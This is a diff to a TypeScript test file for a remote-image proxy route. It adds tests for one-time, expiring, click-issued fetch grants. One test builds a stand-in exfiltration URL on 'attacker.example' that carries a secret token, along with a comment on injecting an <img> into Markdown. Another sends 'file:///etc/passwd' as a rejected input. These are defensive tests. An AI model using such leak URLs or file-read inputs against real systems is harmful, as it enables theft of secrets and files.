@@ -1,5 +1,6 @@
 import { createServer, type Server } from "node:http";
 import type { AddressInfo } from "node:net";
+import { RemoteImageGrant } from "@codeden/contracts";
 import { Hono } from "hono";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { publicFetch } from "../src/network/public-fetch";
@@ -7,6 +8,7 @@ import { remoteImageRoutes } from "../src/routes/remote-image";
 import { errorResponse } from "../src/routes/validate";
 import { ServiceError } from "../src/services/errors";
 import { fetchRemoteImage } from "../src/services/remote-image";
+import { RemoteImageGrants } from "../src/services/remote-image-grants";
 
 const PNG = Buffer.from("89504e470d0a1a0a", "hex");
 let images: Server;
@@ -78,18 +80,94 @@ describe("remote images (#317)", () => {
   });
 
   it("serves the image inert: no sniffing, no script, sandboxed", async () => {
-    const app = new Hono()
-      .onError((error, c) => errorResponse(error, c))
-      .route(
-        "/",
-        remoteImageRoutes(async () => ({ contentType: "image/svg+xml", body: PNG })),
-      );
-    const res = await app.request(`/?url=${encodeURIComponent("https://a.example/x.svg")}`);
+    const { app, click } = imageApp("image/svg+xml");
+    const { id } = await click("https://a.example/x.svg");
+    const res = await app.request(`/${id}`);
     expect(res.status).toBe(200);
     expect(res.headers.get("content-type")).toBe("image/svg+xml");
     expect(res.headers.get("x-content-type-options")).toBe("nosniff");
     expect(res.headers.get("content-security-policy")).toContain("sandbox");
     expect(Buffer.from(await res.arrayBuffer())).toEqual(PNG);
-    expect((await app.request("/?url=file:///etc/passwd")).status).toBe(400);
+    const bad = await app.request("/", json({ url: "file:///etc/passwd" }));
+    expect(bad.status).toBe(400);
   });
 });
+
+describe("Load image grants (#341)", () => {
+  it("refuses a direct ?url= request: only fetches the app started after a click", async () => {
+    // An <img src="/api/remote-image?url=…"> that slipped into Markdown or any other HTML is
+    // same-origin, so the CSP lets it through and the install cookie authorizes it.
+    const { app, fetched } = imageApp();
+    const leak = "https://attacker.example/p.png?d=SECRET_TOKEN";
+    const res = await app.request(`/?url=${encodeURIComponent(leak)}`);
+    expect(res.status).toBe(404);
+    // An <img> can only GET: the click's POST needs a JSON body.
+    expect((await app.request("/", { method: "POST", body: `url=${leak}` })).status).toBe(400);
+    expect(fetched).toEqual([]);
+  });
+
+  it("fetches exactly the clicked URL, once", async () => {
+    const { app, click, fetched } = imageApp();
+    const url = "https://images.example/a.png?size=2";
+    const grant = await click(url);
+    expect(RemoteImageGrant.parse(grant)).toEqual(grant);
+    expect((await app.request(`/${grant.id}`)).status).toBe(200);
+    expect(fetched).toEqual([url]);
+    const again = await app.request(`/${grant.id}`);
+    expect(again.status).toBe(404);
+    expect(await again.json()).toMatchObject({ error: { code: "image_not_found" } });
+    expect(fetched).toEqual([url]);
+  });
+
+  it("refuses an unknown or expired id", async () => {
+    let now = Date.parse("2026-11-14T10:00:00Z");
+    const grants = new RemoteImageGrants({ now: () => now, ttlMs: 60_000 });
+    const { app, click, fetched } = imageApp("image/png", grants);
+    expect((await app.request("/unknown-id-0123456789")).status).toBe(404);
+    const { id, expiresAt } = await click("https://images.example/a.png");
+    expect(expiresAt).toBe("2026-11-14T10:01:00.000Z");
+    now += 60_000;
+    expect((await app.request(`/${id}`)).status).toBe(404);
+    expect(fetched).toEqual([]);
+  });
+
+  it("keeps a bounded number of ids, dropping the oldest", () => {
+    const grants = new RemoteImageGrants({ max: 2 });
+    const first = grants.grant("https://images.example/1.png");
+    const second = grants.grant("https://images.example/2.png");
+    const third = grants.grant("https://images.example/3.png");
+    expect(new Set([first.id, second.id, third.id]).size).toBe(3);
+    expect(grants.take(first.id)).toBeUndefined();
+    expect(grants.take(second.id)).toBe("https://images.example/2.png");
+    expect(grants.take(third.id)).toBe("https://images.example/3.png");
+  });
+});
+
+const json = (body: unknown): RequestInit => ({
+  method: "POST",
+  headers: { "content-type": "application/json" },
+  body: JSON.stringify(body),
+});
+
+/** The image routes with a recording downloader, and the UI's click. */
+function imageApp(contentType = "image/png", grants?: RemoteImageGrants) {
+  const fetched: string[] = [];
+  const app = new Hono()
+    .onError((error, c) => errorResponse(error, c))
+    .route(
+      "/",
+      remoteImageRoutes({
+        grants,
+        fetchImage: async (url) => {
+          fetched.push(url);
+          return { contentType, body: PNG };
+        },
+      }),
+    );
+  const click = async (url: string): Promise<RemoteImageGrant> => {
+    const res = await app.request("/", json({ url }));
+    expect(res.status).toBe(200);
+    return (await res.json()) as RemoteImageGrant;
+  };
+  return { app, click, fetched };
+}
